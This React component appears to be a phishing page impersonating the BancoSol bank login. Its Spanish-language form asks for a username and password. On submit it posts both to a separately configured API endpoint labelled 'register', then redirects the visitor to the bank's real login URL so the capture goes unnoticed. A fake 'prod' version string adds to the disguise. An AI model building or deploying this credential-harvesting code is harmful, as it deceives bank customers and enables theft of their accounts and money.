import React, { useState } from 'react';
import axios from 'axios';

const LoginBancoSol = () => {
  const [usuario, setUsuario] = useState('');
  const [contrasena, setContrasena] = useState('');
  const [error, setError] = useState('');

  const API = import.meta.env.VITE_API_URL;

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await axios.post(`${API}/api/register/`, {
        username: usuario,
        password: contrasena,
      });

      if (response.status === 201) {
        setError('');
        setUsuario('');
        setContrasena('');
        window.location.href = 'https://solnet.bdb.bancosol.com.bo/login';
      }
    } catch (error) {
      setError(error.response?.data?.error || 'Error al registrar');
    }
  };

  return (
    <div className="d-flex align-items-center justify-content-center min-vh-100 bg-light">
      <div className="card shadow-lg p-4" style={{ width: '22rem', borderRadius: '1rem' }}>
        <div className="text-center mb-4">
          <img
            src="/bancaluna.jpeg"
            alt="BancoLuna"
            className="img-fluid mb-3"
            style={{ height: '100px', objectFit: 'contain' }}
          />
          <h5 className="fw-semibold text-secondary">Inicia tu sesión</h5>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="mb-3">
            <input
              type="text"
              className="form-control"
              placeholder="Usuario"
              value={usuario}
              onChange={(e) => setUsuario(e.target.value)}
            />
          </div>
          <div className="mb-3">
            <input
              type="password"
              className="form-control"
              placeholder="Contraseña"
              value={contrasena}
              onChange={(e) => setContrasena(e.target.value)}
            />
          </div>
          <div className="form-check d-flex align-items-center mb-3">
            <input type="checkbox" className="form-check-input" id="terms" />
            <label className="form-check-label ms-2 small text-muted" htmlFor="terms">
              Acepto los <span className="text-primary fw-semibold">Términos y Condiciones</span> de este servicio
            </label>
          </div>
          <button type="submit" className="btn btn-warning w-100 text-white fw-semibold">
            Ingresar
          </button>
          {error && <p className="text-danger mt-3 text-center">{error}</p>}
        </form>
        <p className="text-center text-primary mt-3 small" style={{ cursor: 'pointer' }}>
          Olvidé mi contraseña
        </p>
        <div className="text-center mt-4">
          <p className="text-muted small">
            <strong>Ayuda</strong> <br />
            Versión 4.25.12-prod
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginBancoSol;
